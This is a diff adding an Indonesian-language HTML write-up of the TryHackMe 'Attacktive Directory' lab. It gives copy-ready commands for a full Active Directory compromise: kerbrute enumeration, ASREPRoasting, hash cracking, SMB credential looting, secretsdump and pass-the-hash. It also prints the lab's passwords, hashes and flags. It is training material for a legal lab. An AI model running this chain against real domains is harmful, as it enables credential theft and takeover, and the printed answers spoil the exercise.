@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Writeup Attacktive Directory - TryHackMe</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Inter:wght@300;400;500&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --bg: #0a0e13;
+      --bg2: #0f1520;
+      --bg3: #141d2b;
+      --accent: #00ff9d;
+      --accent2: #00cfff;
+      --accent3: #ff4d6d;
+      --accent4: #ffa657;
+      --text: #c9d1d9;
+      --text2: #8b949e;
+      --border: #21262d;
+      --code-bg: #161b22;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Inter', sans-serif;
+      font-size: 15px;
+      line-height: 1.7;
+      min-height: 100vh;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background: repeating-linear-gradient(
+        0deg, transparent, transparent 2px,
+        rgba(0,255,157,0.015) 2px, rgba(0,255,157,0.015) 4px
+      );
+      pointer-events: none;
+      z-index: 1000;
+    }
+
+    /* HEADER */
+    header {
+      background: var(--bg2);
+      border-bottom: 1px solid var(--border);
+      padding: 0 2rem;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .header-inner {
+      max-width: 1100px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 60px;
+    }
+
+    .logo {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 1.1rem;
+      color: var(--accent);
+      text-decoration: none;
+      letter-spacing: 1px;
+    }
+
+    .logo span { color: var(--accent2); }
+
+    nav a {
+      color: var(--text2);
+      text-decoration: none;
+      font-size: 0.85rem;
+      margin-left: 1.5rem;
+      font-family: 'Share Tech Mono', monospace;
+      transition: color 0.2s;
+    }
+
+    nav a:hover { color: var(--accent); }
+
+    /* HERO */
+    .hero {
+      background: linear-gradient(135deg, var(--bg) 0%, #0d1b2a 50%, #110a1a 100%);
+      padding: 5rem 2rem 4rem;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .hero::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background:
+        radial-gradient(ellipse 60% 40% at 50% 0%, rgba(255,77,109,0.07) 0%, transparent 70%),
+        radial-gradient(ellipse 40% 30% at 80% 100%, rgba(0,207,255,0.06) 0%, transparent 70%);
+    }
+
+    .hero-badge {
+      display: inline-block;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.75rem;
+      color: var(--accent3);
+      border: 1px solid var(--accent3);
+      padding: 0.3rem 1rem;
+      border-radius: 2px;
+      margin-bottom: 1.5rem;
+      letter-spacing: 2px;
+      animation: pulse-red 2s infinite;
+    }
+
+    @keyframes pulse-red {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(255,77,109,0.3); }
+      50% { box-shadow: 0 0 0 6px rgba(255,77,109,0); }
+    }
+
+    .hero h1 {
+      font-family: 'Rajdhani', sans-serif;
+      font-size: clamp(2rem, 5vw, 3.5rem);
+      font-weight: 700;
+      line-height: 1.1;
+      margin-bottom: 1rem;
+      position: relative;
+    }
+
+    .hero h1 .red { color: var(--accent3); }
+    .hero h1 .blue { color: var(--accent2); }
+    .hero h1 .green { color: var(--accent); }
+
+    .hero-meta {
+      display: flex;
+      justify-content: center;
+      gap: 1rem;
+      flex-wrap: wrap;
+      margin-top: 1.5rem;
+    }
+
+    .meta-badge {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.75rem;
+      color: var(--text2);
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      padding: 0.3rem 0.8rem;
+      border-radius: 2px;
+    }
+
+    /* ATTACK PATH */
+    .attack-path {
+      max-width: 1100px;
+      margin: 2rem auto;
+      padding: 0 2rem;
+    }
+
+    .path-title {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.7rem;
+      color: var(--accent);
+      letter-spacing: 2px;
+      margin-bottom: 1rem;
+    }
+
+    .path-steps {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      align-items: center;
+    }
+
+    .path-step {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.75rem;
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      padding: 0.4rem 0.8rem;
+      border-radius: 2px;
+      color: var(--text2);
+    }
+
+    .path-step.done { color: var(--accent); border-color: rgba(0,255,157,0.3); }
+    .path-arrow { color: var(--accent2); font-size: 0.8rem; }
+
+    /* LAYOUT */
+    .container {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 2rem;
+      display: grid;
+      grid-template-columns: 260px 1fr;
+      gap: 2.5rem;
+      align-items: start;
+    }
+
+    /* SIDEBAR */
+    .sidebar { position: sticky; top: 80px; }
+
+    .sidebar-box {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 1.2rem;
+      margin-bottom: 1rem;
+    }
+
+    .sidebar-title {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.7rem;
+      color: var(--accent);
+      letter-spacing: 2px;
+      margin-bottom: 1rem;
+      padding-bottom: 0.5rem;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .toc-list { list-style: none; }
+    .toc-list li { margin-bottom: 0.4rem; }
+
+    .toc-list a {
+      color: var(--text2);
+      text-decoration: none;
+      font-size: 0.82rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 0.3rem 0.5rem;
+      border-radius: 2px;
+      transition: all 0.2s;
+      border-left: 2px solid transparent;
+    }
+
+    .toc-list a:hover, .toc-list a.active {
+      color: var(--accent);
+      background: rgba(0,255,157,0.05);
+      border-left-color: var(--accent);
+    }
+
+    .toc-num {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.7rem;
+      color: var(--accent2);
+      min-width: 20px;
+    }
+
+    .tools-list { display: flex; flex-wrap: wrap; gap: 0.4rem; }
+
+    .tool-tag {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.7rem;
+      color: var(--accent2);
+      background: rgba(0,207,255,0.08);
+      border: 1px solid rgba(0,207,255,0.2);
+      padding: 0.2rem 0.6rem;
+      border-radius: 2px;
+    }
+
+    .flag-item {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.75rem;
+      color: var(--accent);
+      background: rgba(0,255,157,0.05);
+      border: 1px solid rgba(0,255,157,0.2);
+      padding: 0.4rem 0.6rem;
+      border-radius: 2px;
+      margin-bottom: 0.4rem;
+      word-break: break-all;
+    }
+
+    .flag-user {
+      font-size: 0.65rem;
+      color: var(--text2);
+      margin-bottom: 0.2rem;
+    }
+
+    /* CONTENT */
+    .content { min-width: 0; }
+
+    .task-section {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      margin-bottom: 1.5rem;
+      overflow: hidden;
+    }
+
+    .task-header {
+      background: var(--bg3);
+      padding: 1rem 1.5rem;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .task-num {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.7rem;
+      color: var(--accent3);
+      background: rgba(255,77,109,0.1);
+      border: 1px solid rgba(255,77,109,0.3);
+      padding: 0.2rem 0.6rem;
+      border-radius: 2px;
+      white-space: nowrap;
+    }
+
+    .task-header h2 {
+      font-family: 'Rajdhani', sans-serif;
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: #fff;
+      flex: 1;
+    }
+
+    .task-toggle { color: var(--text2); font-size: 0.8rem; transition: transform 0.3s; }
+    .task-toggle.open { transform: rotate(180deg); }
+
+    .task-body { padding: 1.5rem; }
+
+    .task-body h3 {
+      font-family: 'Rajdhani', sans-serif;
+      font-size: 1rem;
+      font-weight: 600;
+      color: var(--accent2);
+      margin: 1.5rem 0 0.8rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .task-body h3::before {
+      content: '//';
+      font-family: 'Share Tech Mono', monospace;
+      color: var(--text2);
+      font-size: 0.8rem;
+    }
+
+    .task-body p { color: var(--text); margin-bottom: 1rem; font-size: 0.9rem; }
+
+    /* CODE */
+    .code-block {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      margin: 1rem 0;
+      overflow: hidden;
+    }
+
+    .code-header {
+      background: #1c2128;
+      padding: 0.4rem 1rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .code-lang {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.65rem;
+      color: var(--accent3);
+      letter-spacing: 1px;
+    }
+
+    .copy-btn {
+      background: none;
+      border: 1px solid var(--border);
+      color: var(--text2);
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.65rem;
+      padding: 0.2rem 0.6rem;
+      cursor: pointer;
+      border-radius: 2px;
+      transition: all 0.2s;
+    }
+
+    .copy-btn:hover { color: var(--accent); border-color: var(--accent); }
+    .copy-btn.copied { color: var(--accent); border-color: var(--accent); }
+
+    pre {
+      padding: 1rem;
+      overflow-x: auto;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.82rem;
+      line-height: 1.6;
+      color: #e6edf3;
+    }
+
+    .cmd { color: #79c0ff; }
+    .flag-color { color: var(--accent); font-weight: bold; }
+    .comment { color: #6e7681; font-style: italic; }
+    .success { color: var(--accent); }
+    .hash { color: var(--accent4); word-break: break-all; }
+    .ip { color: #ffa657; }
+    .param { color: #d2a8ff; }
+    .red-text { color: var(--accent3); }
+
+    /* CALLOUTS */
+    .callout {
+      border-radius: 4px;
+      padding: 0.8rem 1rem;
+      margin: 1rem 0;
+      font-size: 0.85rem;
+      display: flex;
+      gap: 0.8rem;
+      align-items: flex-start;
+    }
+
+    .callout-icon { font-size: 1rem; flex-shrink: 0; margin-top: 0.1rem; }
+
+    .callout.tip { background: rgba(0,255,157,0.06); border-left: 3px solid var(--accent); color: #a8f0c8; }
+    .callout.warning { background: rgba(255,77,109,0.06); border-left: 3px solid var(--accent3); color: #ffb3bf; }
+    .callout.info { background: rgba(0,207,255,0.06); border-left: 3px solid var(--accent2); color: #a8d8f0; }
+
+    /* ANSWER TABLE */
+    .answer-table { width: 100%; border-collapse: collapse; margin: 1rem 0; font-size: 0.85rem; }
+
+    .answer-table th {
+      background: var(--bg3);
+      color: var(--accent3);
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.7rem;
+      letter-spacing: 1px;
+      padding: 0.6rem 1rem;
+      text-align: left;
+      border: 1px solid var(--border);
+    }
+
+    .answer-table td { padding: 0.6rem 1rem; border: 1px solid var(--border); color: var(--text); }
+    .answer-table tr:hover td { background: rgba(255,77,109,0.03); }
+    .answer-val { font-family: 'Share Tech Mono', monospace; color: var(--accent); font-size: 0.82rem; }
+
+    /* SCREENSHOT */
+    .screenshot { margin: 1rem 0; border: 1px solid var(--border); border-radius: 4px; overflow: hidden; }
+
+    .screenshot-header {
+      background: var(--bg3);
+      padding: 0.4rem 1rem;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.65rem;
+      color: var(--text2);
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      gap: 0.5rem;
+      align-items: center;
+    }
+
+    .dot { width: 8px; height: 8px; border-radius: 50%; }
+    .dot-r { background: #ff5f57; }
+    .dot-y { background: #ffbd2e; }
+    .dot-g { background: #28c840; }
+
+    .screenshot img { width: 100%; display: block; }
+    .screenshot-placeholder {
+      background: var(--code-bg);
+      padding: 2rem;
+      text-align: center;
+      color: var(--text2);
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.75rem;
+    }
+
+    /* FOOTER */
+    footer {
+      background: var(--bg2);
+      border-top: 1px solid var(--border);
+      padding: 2rem;
+      text-align: center;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.75rem;
+      color: var(--text2);
+    }
+
+    footer .accent { color: var(--accent); }
+
+    /* RESPONSIVE */
+    @media (max-width: 768px) {
+      .container { grid-template-columns: 1fr; padding: 1.5rem 1rem; }
+      .sidebar { position: static; }
+      .path-steps { flex-direction: column; align-items: flex-start; }
+    }
+
+    ::-webkit-scrollbar { width: 6px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+    ::-webkit-scrollbar-thumb:hover { background: var(--accent3); }
+
+    inline-code {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.82rem;
+      color: var(--accent2);
+      background: var(--code-bg);
+      padding: 0.1rem 0.4rem;
+      border-radius: 2px;
+      border: 1px solid var(--border);
+    }
+  </style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header>
+  <div class="header-inner">
+    <a href="#" class="logo">[<span>AD</span>Basic_IDN]</a>
+    <nav>
+      <a href="#task3">Enum</a>
+      <a href="#task4">Kerbrute</a>
+      <a href="#task5">ASREPRoast</a>
+      <a href="#task6">SMB</a>
+      <a href="#task7">PrivEsc</a>
+      <a href="#task8">Flags</a>
+    </nav>
+  </div>
+</header>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-badge">TRYHACKME // WRITEUP #2</div>
+  <h1>
+    <span class="red">Attacktive</span><br/>
+    <span class="blue">Directory</span>
+  </h1>
+  <p style="color: var(--text2); font-size:0.9rem; margin-top:0.8rem;">
+    Full AD compromise — dari ASREPRoasting sampai Pass-the-Hash sebagai Administrator.
+  </p>
+  <div class="hero-meta">
+    <span class="meta-badge">🎯 Difficulty: Medium</span>
+    <span class="meta-badge">🖥️ OS: Kali Linux</span>
+    <span class="meta-badge">🌐 Domain: spookysec.local</span>
+    <span class="meta-badge">📅 11 Maret 2026</span>
+    <span class="meta-badge">✍️ Roynaldo Rangga Kusuma</span>
+  </div>
+</section>
+
+<!-- ATTACK PATH -->
+<div class="attack-path">
+  <div class="path-title">// ATTACK PATH</div>
+  <div class="path-steps">
+    <span class="path-step done">Nmap</span>
+    <span class="path-arrow">→</span>
+    <span class="path-step done">Kerbrute</span>
+    <span class="path-arrow">→</span>
+    <span class="path-step done">ASREPRoast</span>
+    <span class="path-arrow">→</span>
+    <span class="path-step done">Hash Crack</span>
+    <span class="path-arrow">→</span>
+    <span class="path-step done">SMB Enum</span>
+    <span class="path-arrow">→</span>
+    <span class="path-step done">secretsdump</span>
+    <span class="path-arrow">→</span>
+    <span class="path-step done">Evil-WinRM</span>
+    <span class="path-arrow">→</span>
+    <span class="path-step done">🏆 Admin</span>
+  </div>
+</div>
+
+<!-- MAIN -->
+<div class="container">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <div class="sidebar-title">// DAFTAR ISI</div>
+      <ul class="toc-list">
+        <li><a href="#task3"><span class="toc-num">03</span> Enumeration</a></li>
+        <li><a href="#task4"><span class="toc-num">04</span> Kerbrute</a></li>
+        <li><a href="#task5"><span class="toc-num">05</span> ASREPRoasting</a></li>
+        <li><a href="#task6"><span class="toc-num">06</span> SMB Enumeration</a></li>
+        <li><a href="#task7"><span class="toc-num">07</span> Privilege Escalation</a></li>
+        <li><a href="#task8"><span class="toc-num">08</span> Flag Submission</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-box">
+      <div class="sidebar-title">// TOOLS</div>
+      <div class="tools-list">
+        <span class="tool-tag">nmap</span>
+        <span class="tool-tag">kerbrute</span>
+        <span class="tool-tag">impacket</span>
+        <span class="tool-tag">john</span>
+        <span class="tool-tag">smbclient</span>
+        <span class="tool-tag">evil-winrm</span>
+        <span class="tool-tag">hashcat</span>
+      </div>
+    </div>
+    <div class="sidebar-box">
+      <div class="sidebar-title">// FLAGS</div>
+      <div class="flag-user">svc-admin</div>
+      <div class="flag-item">TryHackMe{K3rb3r0s_Pr3_4uth}</div>
+      <div class="flag-user">backup</div>
+      <div class="flag-item">TryHackMe{B4ckM3UpSc0tty!}</div>
+      <div class="flag-user">Administrator</div>
+      <div class="flag-item">TryHackMe{4ctiveD1rectoryM4st3r}</div>
+    </div>
+  </aside>
+
+  <!-- CONTENT -->
+  <main class="content">
+
+    <!-- TASK 3 -->
+    <section class="task-section" id="task3">
+      <div class="task-header" onclick="toggleTask(this)">
+        <span class="task-num">TASK 03</span>
+        <h2>Enumeration</h2>
+        <span class="task-toggle open">▼</span>
+      </div>
+      <div class="task-body">
+        <h3>Nmap Scan</h3>
+        <p>Mulai dengan full port scan untuk identifikasi semua service yang berjalan di target.</p>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
+          <pre><span class="cmd">nmap</span> <span class="param">-p- -sV -sC --min-rate 5000</span> <span class="ip">10.48.186.111</span></pre>
+        </div>
+        <div class="callout info">
+          <span class="callout-icon">ℹ️</span>
+          <div>Dari output nmap ditemukan: <strong>NetBIOS-Domain Name: THM-AD</strong>, domain <strong>spookysec.local</strong>, dan Windows Server 2019.</div>
+        </div>
+        <table class="answer-table">
+          <tr><th>PERTANYAAN</th><th>JAWABAN</th></tr>
+          <tr><td>Tool untuk enumerate port 139/445</td><td><span class="answer-val">enum4linux</span></td></tr>
+          <tr><td>NetBIOS-Domain Name</td><td><span class="answer-val">THM-AD</span></td></tr>
+          <tr><td>Invalid TLD yang umum dipakai</td><td><span class="answer-val">.local</span></td></tr>
+        </table>
+      </div>
+    </section>
+
+    <!-- TASK 4 -->
+    <section class="task-section" id="task4">
+      <div class="task-header" onclick="toggleTask(this)">
+        <span class="task-num">TASK 04</span>
+        <h2>Enumerating Users via Kerbrute</h2>
+        <span class="task-toggle open">▼</span>
+      </div>
+      <div class="task-body">
+        <h3>Download Wordlist</h3>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
+          <pre><span class="cmd">wget</span> https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
+<span class="cmd">wget</span> https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt</pre>
+        </div>
+
+        <h3>Jalankan Kerbrute</h3>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
+          <pre><span class="cmd">kerbrute</span> userenum <span class="param">--dc</span> <span class="ip">10.48.186.111</span> <span class="param">-d</span> spookysec.local userlist.txt</pre>
+        </div>
+        <div class="callout tip">
+          <span class="callout-icon">💡</span>
+          <div>Dua akun yang paling menarik: <strong style="color:var(--accent)">svc-admin</strong> (service account) dan <strong style="color:var(--accent)">backup</strong> (backup account untuk DC).</div>
+        </div>
+        <table class="answer-table">
+          <tr><th>PERTANYAAN</th><th>JAWABAN</th></tr>
+          <tr><td>Command Kerbrute untuk enumerate users</td><td><span class="answer-val">userenum</span></td></tr>
+          <tr><td>Notable account #1</td><td><span class="answer-val">svc-admin</span></td></tr>
+          <tr><td>Notable account #2</td><td><span class="answer-val">backup</span></td></tr>
+        </table>
+      </div>
+    </section>
+
+    <!-- TASK 5 -->
+    <section class="task-section" id="task5">
+      <div class="task-header" onclick="toggleTask(this)">
+        <span class="task-num">TASK 05</span>
+        <h2>Abusing Kerberos — ASREPRoasting</h2>
+        <span class="task-toggle open">▼</span>
+      </div>
+      <div class="task-body">
+        <h3>Ambil Kerberos Ticket</h3>
+        <p>ASREPRoasting menyerang akun yang tidak memerlukan Kerberos pre-authentication. Kita gunakan GetNPUsers dari Impacket.</p>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
+          <pre><span class="cmd">impacket-GetNPUsers</span> spookysec.local/ <span class="param">-usersfile</span> userlist.txt <span class="param">-no-pass -dc-ip</span> <span class="ip">10.48.186.111</span></pre>
+        </div>
+        <p>Hash berhasil didapat dari akun <inline-code>svc-admin</inline-code>:</p>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">HASH</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
+          <pre><span class="hash">$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:b2bf19c28264b4dc8e22cecd8f176551$86adc3eee89a...</span></pre>
+        </div>
+
+        <h3>Crack Hash dengan John</h3>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
+          <pre><span class="cmd">john</span> <span class="param">--wordlist=</span>passwordlist.txt hash.txt</pre>
+        </div>
+        <div class="callout tip">
+          <span class="callout-icon">🎉</span>
+          <div>Password berhasil di-crack: <strong style="color:var(--accent)">management2005</strong></div>
+        </div>
+        <table class="answer-table">
+          <tr><th>PERTANYAAN</th><th>JAWABAN</th></tr>
+          <tr><td>User yang bisa di-query tanpa password</td><td><span class="answer-val">svc-admin</span></td></tr>
+          <tr><td>Tipe Kerberos hash</td><td><span class="answer-val">Kerberos 5, etype 23, AS-REP</span></td></tr>
+          <tr><td>Hashcat mode</td><td><span class="answer-val">18200</span></td></tr>
+          <tr><td>Password svc-admin</td><td><span class="answer-val">management2005</span></td></tr>
+        </table>
+      </div>
+    </section>
+
+    <!-- TASK 6 -->
+    <section class="task-section" id="task6">
+      <div class="task-header" onclick="toggleTask(this)">
+        <span class="task-num">TASK 06</span>
+        <h2>Back to the Basics — SMB Enumeration</h2>
+        <span class="task-toggle open">▼</span>
+      </div>
+      <div class="task-body">
+        <h3>List SMB Shares</h3>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
+          <pre><span class="cmd">smbclient</span> <span class="param">-L</span> //<span class="ip">10.48.186.111</span> <span class="param">-U</span> svc-admin%management2005</pre>
+        </div>
+
+        <h3>Akses Share backup</h3>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
+          <pre><span class="cmd">smbclient</span> //<span class="ip">10.48.186.111</span>/backup <span class="param">-U</span> svc-admin%management2005
+smb: \> <span class="cmd">get</span> backup_credentials.txt
+smb: \> <span class="cmd">exit</span>
+<span class="cmd">cat</span> backup_credentials.txt
+<span class="comment"># Output: YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw</span>
+<span class="cmd">echo</span> <span class="param">"YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw"</span> | <span class="cmd">base64 -d</span>
+<span class="success"># backup@spookysec.local:backup2517860</span></pre>
+        </div>
+        <div class="callout warning">
+          <span class="callout-icon">⚠️</span>
+          <div>Credentials backup tersimpan dalam Base64 — ini praktik keamanan yang sangat buruk! Credentials tidak boleh disimpan dalam encoding yang mudah di-decode.</div>
+        </div>
+        <table class="answer-table">
+          <tr><th>PERTANYAAN</th><th>JAWABAN</th></tr>
+          <tr><td>Utility untuk map SMB shares</td><td><span class="answer-val">smbclient</span></td></tr>
+          <tr><td>Option untuk list shares</td><td><span class="answer-val">-L</span></td></tr>
+          <tr><td>Jumlah remote shares</td><td><span class="answer-val">6</span></td></tr>
+          <tr><td>Share yang bisa diakses</td><td><span class="answer-val">backup</span></td></tr>
+          <tr><td>Isi file (encoded)</td><td><span class="answer-val">YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw</span></td></tr>
+          <tr><td>Isi file (decoded)</td><td><span class="answer-val">backup@spookysec.local:backup2517860</span></td></tr>
+        </table>
+      </div>
+    </section>
+
+    <!-- TASK 7 -->
+    <section class="task-section" id="task7">
+      <div class="task-header" onclick="toggleTask(this)">
+        <span class="task-num">TASK 07</span>
+        <h2>Elevating Privileges — secretsdump</h2>
+        <span class="task-toggle open">▼</span>
+      </div>
+      <div class="task-body">
+        <h3>Dump Semua Password Hash</h3>
+        <p>Akun <inline-code>backup</inline-code> memiliki privilege untuk sync semua perubahan AD termasuk password hash. Kita eksploitasi ini dengan secretsdump.</p>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
+          <pre><span class="cmd">impacket-secretsdump</span> <span class="param">-just-dc</span> backup:backup2517860@<span class="ip">10.48.186.111</span></pre>
+        </div>
+        <p>Hash Administrator berhasil didapat:</p>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">OUTPUT</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
+          <pre>Administrator:500:aad3b435b51404eeaad3b435b51404ee:<span class="hash">0e0363213e37b94221497260b0bcb4fc</span>:::
+<span class="comment"># Format: username:rid:lmhash:nthash</span></pre>
+        </div>
+        <div class="callout info">
+          <span class="callout-icon">ℹ️</span>
+          <div><strong>Pass the Hash</strong> — teknik serangan dimana kita menggunakan NTLM hash langsung untuk autentikasi tanpa perlu tahu password aslinya.</div>
+        </div>
+        <table class="answer-table">
+          <tr><th>PERTANYAAN</th><th>JAWABAN</th></tr>
+          <tr><td>Method yang dipakai dump NTDS.DIT</td><td><span class="answer-val">DRSUAPI</span></td></tr>
+          <tr><td>Administrator NTLM hash</td><td><span class="answer-val">0e0363213e37b94221497260b0bcb4fc</span></td></tr>
+          <tr><td>Metode serangan tanpa password</td><td><span class="answer-val">Pass the Hash</span></td></tr>
+          <tr><td>Option Evil-WinRM untuk hash</td><td><span class="answer-val">-H</span></td></tr>
+        </table>
+      </div>
+    </section>
+
+    <!-- TASK 8 -->
+    <section class="task-section" id="task8">
+      <div class="task-header" onclick="toggleTask(this)">
+        <span class="task-num">TASK 08</span>
+        <h2>Flag Submission — Game Over!</h2>
+        <span class="task-toggle open">▼</span>
+      </div>
+      <div class="task-body">
+        <h3>Login sebagai Administrator</h3>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
+          <pre><span class="cmd">evil-winrm</span> <span class="param">-i</span> <span class="ip">10.48.186.111</span> <span class="param">-u</span> Administrator <span class="param">-H</span> 0e0363213e37b94221497260b0bcb4fc</pre>
+        </div>
+
+        <h3>Ambil Semua Flag</h3>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">POWERSHELL</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
+          <pre><span class="cmd">type</span> C:\Users\svc-admin\Desktop\user.txt.txt
+<span class="success">TryHackMe{K3rb3r0s_Pr3_4uth}</span>
+
+<span class="cmd">type</span> C:\Users\backup\Desktop\PrivEsc.txt
+<span class="success">TryHackMe{B4ckM3UpSc0tty!}</span>
+
+<span class="cmd">type</span> C:\Users\Administrator\Desktop\root.txt
+<span class="success">TryHackMe{4ctiveD1rectoryM4st3r}</span></pre>
+        </div>
+        <div class="callout tip">
+          <span class="callout-icon">🏆</span>
+          <div>Room selesai! Full domain compromise berhasil dilakukan dari zero credentials sampai Administrator access.</div>
+        </div>
+        <table class="answer-table">
+          <tr><th>USER</th><th>FLAG</th></tr>
+          <tr><td>svc-admin</td><td><span class="answer-val flag-color">TryHackMe{K3rb3r0s_Pr3_4uth}</span></td></tr>
+          <tr><td>backup</td><td><span class="answer-val flag-color">TryHackMe{B4ckM3UpSc0tty!}</span></td></tr>
+          <tr><td>Administrator</td><td><span class="answer-val flag-color">TryHackMe{4ctiveD1rectoryM4st3r}</span></td></tr>
+        </table>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <p>Dibuat untuk keperluan pembelajaran. Semua teknik hanya dilakukan di lab <span class="accent">TryHackMe</span> yang legal.</p>
+  <p style="margin-top:0.5rem;">© 2026 <span class="accent">Roynaldo Rangga Kusuma</span> — ADBasic Enumeration IDN</p>
+</footer>
+
+<script>
+  function toggleTask(header) {
+    const body = header.nextElementSibling;
+    const toggle = header.querySelector('.task-toggle');
+    const isOpen = body.style.display !== 'none';
+    body.style.display = isOpen ? 'none' : 'block';
+    toggle.classList.toggle('open', !isOpen);
+  }
+
+  function copyCode(btn) {
+    const pre = btn.closest('.code-block').querySelector('pre');
+    navigator.clipboard.writeText(pre.innerText).then(() => {
+      btn.textContent = 'COPIED!';
+      btn.classList.add('copied');
+      setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 2000);
+    });
+  }
+
+  const sections = document.querySelectorAll('.task-section');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        tocLinks.forEach(link => link.classList.remove('active'));
+        const activeLink = document.querySelector(`.toc-list a[href="#${entry.target.id}"]`);
+        if (activeLink) activeLink.classList.add('active');
+      }
+    });
+  }, { threshold: 0.3 });
+
+  sections.forEach(s => observer.observe(s));
+</script>
+</body>
+</html>
